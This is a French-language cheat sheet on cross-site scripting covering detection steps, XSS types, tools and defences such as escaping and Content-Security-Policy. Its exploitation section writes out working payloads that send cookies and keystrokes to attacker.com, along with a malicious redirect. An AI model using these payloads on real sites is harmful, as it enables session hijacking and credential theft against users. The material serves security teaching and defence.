# 🌐 XSS (Cross-Site Scripting) - Cheatsheet Cyber

Ce fichier regroupe les notions clés, techniques, étapes pour détecter, exploiter et se protéger contre les failles XSS, un vecteur d’attaque très courant en cybersécurité web.

---

## 🔍 1. Qu’est-ce que le XSS ?

Le Cross-Site Scripting (XSS) est une vulnérabilité qui permet à un attaquant d’injecter du code JavaScript malveillant dans une page web vue par d’autres utilisateurs.  
Cette faille permet de voler des cookies, détourner des sessions, rediriger vers des sites malveillants, etc.

---

## 🔎 2. Étapes pour reconnaître une XSS

### 1. Identifier les points d’injection

- Tester tous les paramètres URL, formulaires, headers (User-Agent, Referer)
- Rechercher les champs qui reflètent les entrées utilisateur dans la page (ex: recherche, commentaires, profils)

### 2. Tester les entrées avec des payloads simples

Injecter dans les paramètres ou formulaires :  
<script>alert('XSS')</script>  
> Vérifier si la page affiche ce script sans l’échapper (popup apparaît)

### 3. Tester les variantes d’encodage

- Injection avec guillemets et balises :  
"><script>alert(1)</script>  
- Encodages URL, HTML entities  
- Tester les injections dans différents contextes (attributs HTML, scripts, CSS)

### 4. Analyser la réponse HTTP

- Vérifier si l’entrée est reflétée dans le code source HTML ou JavaScript
- Observer si les caractères spéciaux sont correctement échappés ou filtrés

### 5. Utiliser des outils automatisés

- Burp Suite Scanner  
- OWASP ZAP  
- XSStrike  
- DOM Invader (Burp Suite) pour XSS DOM-based

---

## 🛠 3. Types de XSS

### 1. Reflected XSS  
Le script malveillant est injecté via une requête et renvoyé immédiatement dans la réponse (URL, formulaire).

### 2. Stored XSS  
Le script est stocké côté serveur (BDD, logs, etc.) et exécuté à chaque affichage de la page.

### 3. DOM-based XSS  
L’injection et l’exécution se produisent uniquement côté client via la manipulation du DOM.

---

## 💥 4. Exploitation basique XSS

### Vol de cookie via JavaScript

<script>
  fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>  
> Envoie les cookies à un serveur attaquant

### Redirection malveillante

<script>window.location='http://attacker.com'</script>

### Keylogger simple

<script>
document.onkeypress = function(e) {
  fetch('http://attacker.com/log?key=' + e.key);
};
</script>

---

## 🔐 5. Protection contre le XSS

### Côté serveur

> Échapper les caractères spéciaux HTML (<, >, ", ', &)  
> Utiliser des fonctions/frameworks sécurisés (ex: htmlspecialchars en PHP)  
> Valider/saniter strictement les entrées utilisateur

### Côté client

Utiliser les headers HTTP :

Content-Security-Policy: default-src 'self'; script-src 'self';  
X-XSS-Protection: 1; mode=block

Éviter l’utilisation dangereuse de innerHTML en JS

---

## 🛠 6. Outils & ressources utiles

OWASP XSS Prevention Cheat Sheet  
Burp Suite  
XSStrike  
DOM Invader (Burp)  

---

## 📌 Ressources supplémentaires

PortSwigger Academy - XSS  
XSS Game by Google  
PayloadsAllTheThings - XSS

---
